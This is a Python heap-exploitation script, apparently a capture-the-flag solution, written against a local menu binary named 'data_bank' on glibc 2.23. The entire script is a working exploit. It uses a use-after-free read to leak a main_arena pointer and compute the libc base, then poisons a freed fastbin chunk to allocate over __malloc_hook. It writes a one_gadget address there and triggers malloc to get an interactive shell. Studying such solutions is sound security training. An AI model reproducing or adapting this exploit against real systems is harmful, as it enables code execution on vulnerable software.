from roppy import *

p = process("./data_bank")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

context.log_level = "info"
def add(idx, size, data):
    p.sendlineafter(">> ", "1")
    p.sendlineafter(":\n", str(idx))
    p.sendlineafter(":\n", str(size))
    p.sendlineafter(":\n", data)

def edit(idx, data):
	p.sendlineafter(">> ", "2")
	p.sendlineafter(":\n", str(idx))
	p.sendlineafter(":\n", data)

def remove(idx):
	p.sendlineafter(">> ", "3")
	p.sendlineafter(":\n", str(idx))

def view(idx):
	p.sendlineafter(">> ", "4")
	p.sendlineafter(":\n", str(idx))


add(0, 0x100, "A"*8)
add(1, 0x60, "B"*24)
add(2, 0x60, "C"*8)
remove(0)
remove(1)
remove(2)
view(0)
p.recvuntil(":")
leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("main_arena:   0x%x" %(leak))
libc.address = leak - 0x3c4b78
malloc_hook = libc.address + 0x3c4b10
log.info("LIBC:         0x%x" %(libc.address))
edit(2, p64(malloc_hook - 0x23)[:6])
add(3, 100, "D"*8)

payload = b"\x00"*19
payload += p64(libc.address + 0xf0364)
add(5, 100, payload)

p.sendlineafter(">> ", "1")
p.sendlineafter(":\n", "6")
p.sendlineafter(":\n", "10")
p.interactive()
